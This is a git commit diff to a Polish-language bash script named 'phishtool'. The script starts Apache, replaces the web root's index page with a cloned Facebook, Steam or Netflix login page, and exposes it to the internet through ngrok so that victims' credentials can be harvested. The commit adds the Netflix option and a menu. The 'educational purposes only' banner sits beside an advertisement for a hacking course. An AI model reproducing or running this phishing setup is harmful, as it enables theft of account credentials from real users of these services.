d6e3f37c7e98bcbe277b463504500d0931a08dc7
Przemysław Szmaj <37410338+PSZMAJ@users.noreply.github.com>
2022-05-16 14:48:41 +0200

    update

--- run.sh
+++ run.sh
@@ -1,5 +1,42 @@
 #!/bin/bash
-echo "Narzędzie powstało tylko do celów edukacyjnych! --> phishtool Version 1.1"
+sudo service apache2 start
+
+facebook_login_page()
+{
+	echo "wybrales fb";
+	sudo rm /var/www/html/index.html
+	sudo cp facebook/index.html /var/www/html/index.html
+	./ngrok http 80
+	sudo rm /var/www/html/index.html
+}
+
+stream_login_page()
+{
+	echo "wybrales Steama";
+	sudo rm /var/www/html/index.html
+	sudo cp steam/index.html /var/www/html/index.html
+	./ngrok http 80
+	sudo rm /var/www/html/index.html
+}
+netflix_login_page()
+{
+	echo "wybrales Netflixa";
+	sudo rm /var/www/html/index.html
+	sudo cp netflix/index.html /var/www/html/index.html
+	./ngrok http 80
+	sudo rm /var/www/html/index.html
+}
+
+
+
+exit_work()
+{
+	exit
+}
+
+
+
+echo "Narzędzie powstało tylko do celów edukacyjnych! --> phishtool Version 2.0"
 sleep 2
 echo "kup kurs na www.ehaker.pl"
 sleep 2
@@ -7,29 +44,27 @@ echo "Wybierz opcje"
 echo "================="
 echo "[1] --->Facebook"
 echo "[2] --->Steam"
+echo "[3] --->Netflix"
+echo "[11] --->EXIT"
 echo "================="
 
-sudo service apache2 start
 
 read opcja
  
-if [ $opcja = 1 ]
-then
-	echo "wybrales fb";
-	sudo rm /var/www/html/index.html
-	sudo cp facebook/index.html /var/www/html/index.html
-	./ngrok http 80
-	sudo rm /var/www/html/index.html
-else
-	echo "wybrales Steama";
-	sudo rm /var/www/html/index.html
-	sudo cp steam/index.html /var/www/html/index.html
-	./ngrok http 80
-	sudo rm /var/www/html/index.html
 
+case "$opcja" in
+
+
+  "1") facebook_login_page ;;
+  "2") stream_login_page ;;
+  "3") netflix_login_page ;;
+  "11") exit_work ;;
+  *)  ./run2.sh
+  
+esac
 
 echo " Narzędzie zakończyło pracę "
 sudo service apache2 stop
 sleep 2
 exit
-fi
+
